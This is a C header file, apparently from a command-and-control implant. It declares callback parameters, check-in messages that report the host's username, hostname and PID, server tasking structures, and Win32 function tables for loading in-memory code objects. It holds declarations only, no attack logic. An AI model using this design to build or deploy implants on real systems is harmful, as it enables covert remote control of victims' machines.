#include "HTTP.h"

#define MESSAGE_TYPE_CHECKIN 1
#define MESSAGE_TYPE_TASKING 2

typedef struct AgentParams {
	char *payload_uuid;
	char *callback_uuid;
	char *callback_host;
	int callback_port;
	int callback_https;
	char *callback_uri;
} AgentParams;

typedef struct CheckinRequest {
	char *payload_uuid;
	unsigned int pid;
	char *username;
	char *hostname;
} CheckinRequest;

typedef struct CheckinReply {
	char action;
	char *callback_uuid;
	char *status;
} CheckinReply;

typedef struct TaskingRequest {
	char *callback_uuid;
	char tasking_size;
} TaskingRequest;

typedef struct TaskInfo {
	char *id;
	char *command;
	char *parameters;
	int timestamp;
} TaskInfo;

typedef struct TaskingReply {
	char action;
	char tasking_size;
	TaskInfo *tasks;
} TaskingReply;

typedef struct AgentState {
	HttpHandle *http;
	AgentParams params;
} AgentState;

void append_str(char *string, char *append);
char *clone_str(char *orig);
void base64_encode(const char *in, const unsigned long in_len, char *out);
int base64_decode(const char *in, const unsigned long in_len, char *out);

char *generate_checkin_message(CheckinRequest *checkin);
void parse_checkin_reply(HttpResponse *response, CheckinReply *reply);
void free_checkin_request(CheckinRequest *request);
void free_checkin_reply(CheckinReply *reply);

char *generate_tasking_message(TaskingRequest *tasking);
void parse_tasking_reply(HttpResponse *response, TaskingReply *reply);
void free_tasking_request(TaskingRequest *request);
void free_tasking_reply(TaskingReply *reply);

char *unpack_str(char *raw_params, int *offset);
int unpack_int(char *raw_params, int *offset);
void unpack_params(char *raw_params, AgentParams *params);
void free_params(AgentParams *params);

/*
 *
 * PICOs
 *
*/

typedef void (*CHECKIN_PICO)(CheckinRequest *req);

typedef struct {
    __typeof__(LoadLibraryA)   * LoadLibraryA;
    __typeof__(GetProcAddress) * GetProcAddress;
    __typeof__(VirtualAlloc)   * VirtualAlloc;
    __typeof__(VirtualFree)    * VirtualFree;
} WIN32FUNCS;

typedef struct {
	char        *CheckinPicoCode;
	char        *CheckinPicoData;
	CHECKIN_PICO CheckinPicoEntrypoint;
} AgentCapabilities;

void load_picos(AgentCapabilities *cap);
void free_picos(AgentCapabilities *cap);
